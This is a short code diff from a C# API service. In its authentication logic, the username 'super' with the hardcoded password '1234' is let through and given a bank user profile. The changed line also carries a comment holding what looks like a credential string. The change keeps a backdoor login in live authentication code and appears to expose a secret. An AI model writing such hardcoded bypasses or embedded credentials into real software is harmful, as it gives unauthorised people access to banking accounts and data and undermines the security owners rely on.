@@ -162,7 +162,7 @@ namespace JichangeApi.Services
                     return GetCompanyUserProfile(company);
                 }
 
-                if(authLog.userName.ToLower().Equals("super") && password.Equals(""))
+                if(authLog.userName.ToLower().Equals("super") && password.Equals("1234")) // $pKwG1rq
                 {
                     //return GetBankUserProfile(authLog);
                     return GetBankUserProfile(empdata);
